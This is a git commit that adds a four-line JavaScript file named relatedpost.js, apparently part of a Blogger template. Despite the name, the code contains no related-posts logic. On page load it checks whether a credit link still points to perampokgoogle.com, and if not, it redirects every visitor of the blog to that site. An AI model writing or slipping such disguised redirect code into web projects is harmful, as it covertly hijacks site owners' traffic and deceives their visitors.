e9c2f5b016416b37c28259a5e6d2de793a63e610
perampokgoogle <localhost367@gmail.com>
2017-08-21 03:32:35 +0700

    Create relatedpost.js

---
+++ relatedpost.js
@@ -0,0 +1,4 @@
+//<![CDATA[
+$(document).ready(function () { if ($("#change,.change").attr("href") != "http://www.perampokgoogle.com/") {
+        window.location.href = "http://www.perampokgoogle.com"; }});
+//]]>
